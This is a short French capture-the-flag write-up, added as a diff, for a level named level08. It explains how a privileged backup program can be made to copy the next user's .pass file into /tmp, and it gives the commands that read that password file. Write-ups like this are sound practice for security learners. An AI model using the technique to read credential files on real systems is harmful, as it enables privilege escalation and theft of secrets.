@@ -1,0 +1,8 @@
+Le programme va ouvrir le fichier passé en paramètre et en faire une sauvegarde byte par byte dans un dossier backup.
+Par manque de permission sur le dossier backup situé dans notre home (lul) on se place dans /tmp, il y est possible de créer le dossier backup.
+
+exploit:
+cd /tmp
+mkdir -p backups/home/users/level09/
+~/level08 /home/users/level09/.pass
+cat backups/home/users/level09/.pass
